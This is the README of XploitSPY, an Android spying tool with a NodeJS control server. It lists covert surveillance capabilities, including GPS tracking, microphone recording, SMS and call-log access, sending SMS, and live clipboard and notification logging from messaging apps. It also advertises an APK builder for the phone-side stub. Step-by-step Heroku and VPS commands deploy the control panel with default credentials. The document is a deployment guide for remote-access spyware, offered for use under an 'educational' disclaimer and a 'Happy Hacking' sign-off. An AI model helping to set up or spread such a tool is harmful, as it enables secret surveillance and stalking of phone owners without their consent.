<p align="center">
<img src="https://github.com/XploitWizer/XploitSPY/raw/master/server/assets/webpublic/logo.png" height="60"><br>
A cloud based Android Spying or Monitoring Tool, powered by NodeJS
</p>

NOTE: Read all steps carefully to setup XploitSPY as we keep changing them as per need

## Features
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging (WhatsApp, Facebook, Instagram, Gmail and more ....)
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Built In APK Builder

## Prerequisites 
 - Java Runtime Environment 9+
    - See [installation](#Installation) for OS specifics
 - NodeJs 
 - A Server 

## Installation on Heroku 


  Video Tutorial for Heroku [Click Here](https://youtu.be/IoJGFZWCPko)


0. Create a Account on [Heroku](https://heroku.com)

1. Click `Create New App` in Heroku Dashboard

2. Enter App Name and click on create app

3. Now install Heroku CLI on your Computer [Instuctions](https://devcenter.heroku.com/articles/heroku-cli)

4. Now open your terminal and run command ` git clone https://github.com/XploitWizer/XploitSPY `

5. It will download Latest codes for you in your PC
    
6. Now change the directory to XploitSPY using command `cd XploitSPY`

7. Now Login into Heroku CLI using command ` heroku login -i` now enter your login details and hit Enter

8. After Login run this command in terminal ` heroku git:remote -a appName` here appName will be your app's name that you choose while creating the app.

9. Now run follow commands in termial to install packages

 - ` heroku buildpacks:add heroku/jvm` 

then run 

 - ` heroku buildpacks:add heroku/nodejs`

10. Now run this command in your terminal ` git push heroku master`, if updating existing app or face any error run this command ` git push -f heroku master`
1
11. All done now it will take time to complete, after that you can visit your domain shown in terminal.



## Installation on VPS or Server
 
 Video Tutorial for VPS or Server [Click Here](https://youtu.be/6bRs7-0AD04)

0. Connect to your server via SSH

1. Install JRE 9+ 
    - Debian, Ubuntu, Etc
        - `sudo apt install openjdk-11-jre-headless`
    - Fedora, Oracle, Red Hat, etc
        -  `sudo yum install java-11-openjdk-devel"`
    - Windows 
        - click [HERE](https://www.oracle.com/technetwork/java/javase/downloads/jre9-downloads-3848532.html) for downloads

2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't really be using this)

3. install PM2 
    - `sudo npm install pm2 -g`

4. Clone this repository
    - `git clone https://github.com/XploitWizer/XploitSPY.git`

5. Now change to the server directory and run these commands 
    - `npm install` <- install dependencies
    - `sudo pm2 start index.js` <-- start the script
    - `sudo pm2 startup` <- to run XploitSPY on startup
    
6. Default Username : admin & Default Password : password

7. In your browser navigate to `http://<SERVER IP or URL>` 

NOTE : XploitSPY now works only on port 80 for both web and client
    
It's recommended to run XploitSPY behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)

## Happy Hacking

## Disclaimer
<b>XploitWizer Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
XploitSPY is built for Educational Purpose. Use at your own Risk.</b>

<br>
<p align="center">Made with ❤️ By <a href="https://xploitwizer.com">XploitWizer</a></p>

## Credits

<b> Credits to <a href="https://github.com/D3VL">D3VL</a> for the original code base this repository is based on at <a href="https://github.com/D3VL/L3MON">L3MON</a>
